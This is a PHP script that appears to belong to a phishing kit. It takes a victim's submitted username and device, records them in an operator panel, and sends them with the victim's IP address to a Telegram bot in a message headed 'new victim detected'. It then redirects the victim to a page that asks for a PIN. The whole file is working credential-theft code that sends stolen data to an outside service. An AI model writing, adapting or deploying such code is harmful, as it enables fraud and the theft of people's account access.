<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$usuario = $_POST['usr'];
$dispositivo = $_POST['dis'];
$ip = $_SERVER['REMOTE_ADDR'];

// Crear registro en el panel
crear_registro($usuario, $dispositivo);

// AVISO DE NUEVA VISITA A TELEGRAM
$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');
$mensaje = "🚀 *NUEVA VÍCTIMA DETECTADA*\n\n";
$mensaje .= "👤 Usuario: " . $usuario . "\n";
$mensaje .= "📱 Dispositivo: " . $dispositivo . "\n";
$mensaje .= "🌐 IP: " . $ip . "\n";

file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown");

// SALTO AL SIGUIENTE PASO (PEDIR PIN)
header("Location: ../a/PASS.php");
?>
